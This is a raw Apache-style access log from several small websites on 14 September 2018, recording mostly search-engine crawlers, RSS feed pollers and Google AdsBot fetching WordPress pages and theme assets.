www.telebid-pro.com:80 95.108.213.12 - - [14/Sep/2018:12:21:49 +0300] "GET /robots.txt HTTP/1.1" 404 203 372 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 143 - 17826
www.telebid-pro.com:80 178.154.171.26 - - [14/Sep/2018:12:21:53 +0300] "GET / HTTP/1.1" 200 280 6781 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 179019 - 8237
www.telebid-pro.com:80 178.154.171.26 - - [14/Sep/2018:12:21:53 +0300] "GET / HTTP/1.1" 200 284 6790 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 240254 - 5139
www.telebid-pro.com:80 95.108.213.12 - - [14/Sep/2018:12:21:53 +0300] "GET / HTTP/1.1" 200 285 6793 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 243115 - 17552
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:21:53 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 336363 - 15910
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:22:47 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 42075 - 17551
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:23:32 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 44115 - 5145
www.telebid-pro.com:80 46.118.121.233 - - [14/Sep/2018:12:23:37 +0300] "GET / HTTP/1.0" 200 205 28563 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" - 102887 - 15909
www.telebid-pro.com:80 46.118.121.233 - - [14/Sep/2018:12:23:37 +0300] "GET / HTTP/1.0" 200 205 28563 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" - 89061 - 17827
www.telebid-pro.com:80 46.118.121.233 - - [14/Sep/2018:12:23:38 +0300] "GET /http:/ HTTP/1.0" 404 211 368 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" - 120 - 5147
tbcloud.dmaster.org:80 66.249.69.251 - - [14/Sep/2018:12:23:51 +0300] "GET / HTTP/1.1" 200 293 4679 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" - 148947 - 17826
hackschool.dmaster.org:80 216.244.66.250 - - [14/Sep/2018:12:24:38 +0300] "GET /robots.txt HTTP/1.1" 404 226 372 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" - 129 - 8237
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:25:26 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 77387 - 5139
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:25:44 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 205795 - 17552
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:28:34 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36368 - 17551
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:30:26 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 211137 - 5145
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:30:43 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 38069 - 15909
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:31:03 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 65127 - 17827
www.telebid-pro.com:80 18.222.108.192 - - [14/Sep/2018:12:32:03 +0300] "GET / HTTP/1.1" 200 201 6781 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/42.0" - 92926 - 8237
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:33:24 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 40453 - 5139
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:34:51 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 372337 - 17552
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:35:59 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 36417 - 15910
www.telebid-pro.com:80 5.83.16.181 - - [14/Sep/2018:12:36:57 +0300] "GET /admin/manager_users.class.php HTTP/1.1" 404 206 391 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" - 118 - 17551
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:38:03 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36679 - 5145
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:38:05 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 38004 - 15909
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:39:34 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 199647 - 17827
www.telebid-pro.com:80 91.208.99.2 - - [14/Sep/2018:12:39:43 +0300] "GET / HTTP/1.1" 200 210 28619 "telebid-pro.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4" - 91538 - 5147
www.telebid-pro.com:80 91.208.99.2 - - [14/Sep/2018:12:39:43 +0300] "GET / HTTP/1.1" 200 210 28619 "telebid-pro.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4" - 91750 - 17826
www.telebid-pro.com:80 91.208.99.2 - - [14/Sep/2018:12:39:44 +0300] "GET / HTTP/1.1" 200 210 28619 "telebid-pro.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4" - 93506 - 8237
hackschool.dmaster.org:80 46.229.168.65 - - [14/Sep/2018:12:39:46 +0300] "GET /robots.txt HTTP/1.1" 404 194 372 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" - 125 - 5139
hackschool.dmaster.org:80 46.229.168.71 - - [14/Sep/2018:12:39:46 +0300] "GET /?m=201502 HTTP/1.1" 200 212 6633 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" - 77324 - 17552
www.telebid-pro.com:80 91.208.99.2 - - [14/Sep/2018:12:40:06 +0300] "GET / HTTP/1.1" 200 210 28619 "telebid-pro.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4" - 85908 - 15910
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:41:06 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36943 - 17551
tbcloud.dmaster.org:80 66.249.69.225 - - [14/Sep/2018:12:42:14 +0300] "GET /?recent_works=goals HTTP/1.1" 200 438 4332 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" - 65738 - 5145
www.telebid-pro.com:80 220.181.108.81 - - [14/Sep/2018:12:42:50 +0300] "GET / HTTP/1.1" 200 248 6781 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" - 88776 - 15909
www.telebid-pro.com:80 111.206.198.31 - - [14/Sep/2018:12:42:56 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/parallax.css?ver=4.1 HTTP/1.1" 200 459 1682 "http://telebid-pro.com/" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" - 146 - 17827
www.telebid-pro.com:80 111.206.198.89 - - [14/Sep/2018:12:42:56 +0300] "GET /wp-content/themes/ninezeroseven/assets/font-awesome/css/font-awesome.min.css?ver=4.1 HTTP/1.1" 200 480 22341 "http://telebid-pro.com/" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" - 169 - 5147
www.telebid-pro.com:80 111.206.221.23 - - [14/Sep/2018:12:42:58 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/main.js?ver=1.0 HTTP/1.1" 200 438 13472 "http://telebid-pro.com/" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" - 168 - 17826
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:43:30 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 39198 - 5139
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:43:59 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 201247 - 17552
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:44:32 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 37310 - 15910
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:45:14 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 43489 - 17551
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:48:17 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 198257 - 17826
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:48:24 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38433 - 5139
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:12:49:40 +0300] "GET /?page_id=135 HTTP/1.1" 200 192 6697 "-" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 108382 - 8237
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:12:50:41 +0300] "GET /wp-content/plugins/google-captcha/css/gglcptch.css?ver=1.30 HTTP/1.1" 200 366 682 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 233 - 17552
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:12:50:42 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/layout.css?ver=4.1 HTTP/1.1" 200 368 6900 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 918 - 15910
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:12:50:42 +0300] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 200 345 3367 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 392 - 17551
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:12:50:43 +0300] "GET /wp-content/plugins/tb2048game/style/main.css?ver=4.1 HTTP/1.1" 200 359 3127 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 498 - 5145
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:12:50:43 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/flexslider.css?ver=4.1 HTTP/1.1" 200 372 1630 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 315 - 15909
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:12:50:44 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/scripts.js?ver=1.0 HTTP/1.1" 200 352 11922 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 1677 - 17827
hackschool.dmaster.org:80 66.249.87.55 - - [14/Sep/2018:12:50:44 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/main.js?ver=1.0 HTTP/1.1" 200 349 2874 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 489 - 5147
hackschool.dmaster.org:80 66.249.87.55 - - [14/Sep/2018:12:50:45 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/jquery.flexslider-min.js?ver=1.0 HTTP/1.1" 200 366 5465 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 619 - 17826
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:12:50:45 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/skeleton.css?ver=4.1 HTTP/1.1" 200 370 1292 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 315 - 5139
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:12:50:46 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/jquery.prettyPhoto.js?ver=1.0 HTTP/1.1" 200 363 6330 "http://hackerschool-bg.com/?page_id=135" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 704 - 8237
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:12:50:54 +0300] "GET /?p=2223 HTTP/1.1" 200 187 8649 "-" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 70245 - 17552
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:51:17 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 35992 - 15910
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:51:23 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37071 - 17551
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:52:29 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38700 - 5145
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:53:44 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 197810 - 15909
hackschool.dmaster.org:80 66.249.69.117 - - [14/Sep/2018:12:55:05 +0300] "GET /?page_id=135 HTTP/1.1" 200 162 6697 "-" "Mediapartners-Google" - 57385 - 17827
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:55:47 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 52068 - 5147
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:56:39 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 38475 - 17826
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:58:13 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 203238 - 5139
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:58:20 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 36788 - 8237
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:13:00:49 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 39331 - 5145
www.telebid-pro.com:80 52.14.43.100 - - [14/Sep/2018:13:02:00 +0300] "GET / HTTP/1.1" 200 201 6781 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Firefox/42.0" - 249017 - 15909
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:03:20 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37303 - 17827
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:13:04:04 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 202550 - 5147
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:13:04:24 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37509 - 17826
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:32 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/prettyPhoto.css?ver=4.1 HTTP/1.1" 200 368 2176 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 407 - 5139
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:13:04:33 +0300] "GET /wp-content/themes/ninezeroseven-child/style.css?ver=4.1 HTTP/1.1" 200 357 1789 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 314 - 8237
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:13:04:34 +0300] "GET /wp-includes/js/comment-reply.min.js?ver=4.1 HTTP/1.1" 200 330 703 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 212 - 15910
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:13:04:34 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/nzs-custom-media.css?ver=4.1 HTTP/1.1" 200 373 1489 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 323 - 17551
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:13:04:35 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/base.css?ver=4.1 HTTP/1.1" 200 361 2671 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 436 - 17552
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:35 +0300] "GET /wp-content/plugins/tb2048game/style/main.css?ver=4.1 HTTP/1.1" 200 354 3127 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 511 - 5145
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:36 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/skeleton.css?ver=4.1 HTTP/1.1" 200 365 1292 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 299 - 15909
hackschool.dmaster.org:80 66.249.87.55 - - [14/Sep/2018:13:04:36 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/jquery.prettyPhoto.js?ver=1.0 HTTP/1.1" 200 358 6330 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 684 - 17827
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:13:04:37 +0300] "GET /wp-content/themes/ninezeroseven/mobile-media-queries.css?ver=4.1 HTTP/1.1" 200 366 722 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 226 - 17552
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:37 +0300] "GET /wp-content/themes/ninezeroseven-child//js/blog_post_modif.js?ver=1.0.0 HTTP/1.1" 200 357 472 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 258 - 17551
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:13:04:37 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/nzs-frame-media.css?ver=4.1 HTTP/1.1" 200 372 1096 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 254 - 15910
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:38 +0300] "GET /wp-content/plugins/google-captcha/css/gglcptch.css?ver=1.30 HTTP/1.1" 200 361 682 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 211 - 8237
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:38 +0300] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 200 329 33532 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 3694 - 5139
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:39 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/scripts.js?ver=1.0 HTTP/1.1" 200 347 11922 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 1151 - 17826
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:39 +0300] "GET /wp-content/plugins/tb2048game/js/require.js HTTP/1.1" 200 330 6529 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 630 - 5145
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:13:04:40 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/main.js?ver=1.0 HTTP/1.1" 200 344 2874 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 575 - 5147
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:13:04:40 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/flexslider.css?ver=4.1 HTTP/1.1" 200 367 1630 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 277 - 15909
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:41 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/layout.css?ver=4.1 HTTP/1.1" 200 363 6900 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 894 - 17827
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:41 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/jquery.flexslider-min.js?ver=1.0 HTTP/1.1" 200 361 5465 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 808 - 17552
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:42 +0300] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 200 340 3367 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 528 - 17551
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:53 +0300] "GET /wp-content/plugins/tb2048game/js/easyModal.js HTTP/1.1" 200 332 1905 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 307 - 15910
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:13:04:53 +0300] "GET /wp-content/plugins/tb2048game/js/game.mini.js HTTP/1.1" 200 332 4162 "http://hackerschool-bg.com/?p=2223" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 545 - 8237
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:05:48 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 37781 - 5145
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:13:08:34 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 205479 - 17827
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:13:08:37 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36186 - 17552
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:09:31 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 44127 - 15910
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:13:12:59 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 267224 - 8237
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:12:59 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 36233 - 5139
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:13:13:46 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37312 - 17826
hackschool.dmaster.org:80 66.249.69.220 - - [14/Sep/2018:13:15:17 +0300] "GET /robots.txt HTTP/1.1" 404 237 372 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" - 176 - 5145
hackschool.dmaster.org:80 66.249.69.192 - - [14/Sep/2018:13:15:17 +0300] "GET / HTTP/1.1" 200 426 6928 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" - 147235 - 15909
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:15:58 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 73531 - 5147
hackschool.dmaster.org:80 54.145.37.204 - - [14/Sep/2018:13:17:57 +0300] "GET /?feed=rss2&cat=1 HTTP/1.1" 200 459 4352 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:15.0) Gecko/20120910144328 Firefox/15.0.2" - 63968 - 17551
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:13:18:08 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 39148 - 15910
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:13:18:15 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 196787 - 8237
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:19:05 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 39359 - 5139
tbcloud.dmaster.org:80 66.249.69.251 - - [14/Sep/2018:13:20:08 +0300] "GET /?recent_works=timeline HTTP/1.1" 200 441 4235 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" - 67598 - 17826
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:20:24 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37724 - 5145
hackschool.dmaster.org:80 95.163.255.202 - - [14/Sep/2018:13:20:57 +0300] "GET /robots.txt HTTP/1.0" 404 253 372 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" - 131 - 5147
hackschool.dmaster.org:80 95.163.255.234 - - [14/Sep/2018:13:20:58 +0300] "GET /?m=201408 HTTP/1.1" 200 284 6361 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" - 138450 - 17827
hackschool.dmaster.org:80 46.229.168.71 - - [14/Sep/2018:13:21:02 +0300] "GET / HTTP/1.1" 200 203 6913 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" - 81096 - 17552
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:13:22:45 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 198440 - 17551
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:13:23:28 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 41754 - 15910
hackschool.dmaster.org:80 46.229.168.78 - - [14/Sep/2018:13:24:24 +0300] "GET / HTTP/1.1" 200 203 6913 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" - 114816 - 5139
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:26:22 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 45517 - 17826
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:13:26:51 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 38993 - 5145
www.pro-code.net:80 185.234.218.57 - - [14/Sep/2018:13:27:25 +0300] "GET / HTTP/1.1" 200 158 19671 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" - 78918 - 5147
